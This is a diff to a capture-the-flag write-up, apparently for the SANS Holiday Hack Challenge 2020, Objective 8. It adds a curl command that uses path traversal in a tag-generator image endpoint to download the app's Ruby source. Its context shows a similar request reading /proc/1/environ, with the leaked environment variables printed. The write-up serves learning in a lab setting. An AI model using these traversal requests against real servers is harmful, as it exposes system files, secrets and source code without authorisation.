@@ -22,7 +22,12 @@ curl https://tag-generator.kringlecastle.com/image?id=../../../proc/1/environ --
 PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=b7610641492eRUBY_MAJOR=2.7RUBY_VERSION=2.7.0RUBY_DOWNLOAD_SHA256=27d350a52a02b53034ca0794efe518667d558f152656c2baaf08f3d0c8b02343GEM_HOME=/usr/local/bundleBUNDLE_SILENCE_ROOT_WARNING=1BUNDLE_APP_CONFIG=/usr/local/bundleAPP_HOME=/appPORT=4141HOST=0.0.0.0GREETZ=JackFrostWasHereHOME=/home/app
 ```
 So the `GREETZ` variable contains **JackFrostWasHere**
+
+The [Ruby application code](https://github.com/joergschwarzwaelder/hhc2020/blob/master/Objective-8/app.rb) can be downloaded through
+```
+curl https://tag-generator.kringlecastle.com/image?id=../../../../../app/lib/app.rb --output app.rb
+```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTMxMjA1NjQ1Myw5MjA0NTU4NjUsLTE2MD
-YwNzgwNDBdfQ==
+eyJoaXN0b3J5IjpbLTEzNjA2MDY4MzcsMTMxMjA1NjQ1Myw5Mj
+A0NTU4NjUsLTE2MDYwNzgwNDBdfQ==
 -->
